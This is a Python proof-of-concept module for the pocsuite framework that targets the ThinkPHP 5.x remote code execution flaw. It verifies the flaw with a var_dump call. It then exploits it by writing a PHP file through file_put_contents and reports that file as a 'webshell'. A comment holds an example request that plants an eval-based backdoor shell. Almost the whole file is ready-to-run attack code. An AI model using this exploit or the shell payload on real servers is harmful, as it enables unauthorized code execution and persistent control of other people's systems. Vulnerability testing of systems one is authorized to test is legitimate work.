#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import string
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from collections import OrderedDict

class ThinkPHP(POCBase):
    vulID = '1'
    version = '1'
    author = 'LyricBao'
    vulDate = '2018-12-10'
    createDate = '2019-1-3'
    updateDate = '2018-1-3'
    references = ['https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ','http://blog.51cto.com/11834557/2328927','https://www.vulnspy.com/cn-thinkphp-5.x-rce/']
    name = 'Thinkphp 5.x < 5.1.31, <= 5.0.23 远程代码执行'
    appPowerLink = 'https://www.thinkphp.cn/'
    appName = 'Thinkphp'
    appVersion = '5.x < 5.1.31, <= 5.0.23'
    vulType = 'Remote code Execute'
    desc = '近日thinkphp团队发布了版本更新https://blog.thinkphp.cn/869075，其中修复了一处getshell漏洞。'
    samples = []
# test url : http://ee9595b48336717d51b2e7ac2a156ab8.vsplate.me:40347/public/
#http://aaa.vsplate.me/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php
    def _attack(self):
            result = {}
            shell_name = str(int(random.random() * 1000))+'.php'
            shell_code = '<?php%20phpinfo();?>'
            #vul_url = '%s/?s=index/\\think\\template\driver\\file/write&cacheFile=%s&content=%s' % (self.url,shell_name,shell_code)
            vul_url = '%s/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=%s&vars[1][]=%s' % (self.url,shell_name,shell_code)

            if not self._verify(verify=False):
                return self.parse_attack(result)
            response = req.post(vul_url)
            if response.status_code == 200 and str(len(shell_code)) in response.content:
                result['webshell'] = self.url+shell_name
            return self.parse_attack(result)

    def _verify(self,verify=True):
            result = {}
            """
            proxies = {
                "http": "http://127.0.0.1:8080"
            }
            """
            vul_url = '%s/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=xxx' % self.url
            response = req.get(vul_url).content
            if 'xxx' in response:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
            return self.parse_attack(result)
    def parse_attack(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail("No ... ")
            return output

register(ThinkPHP)
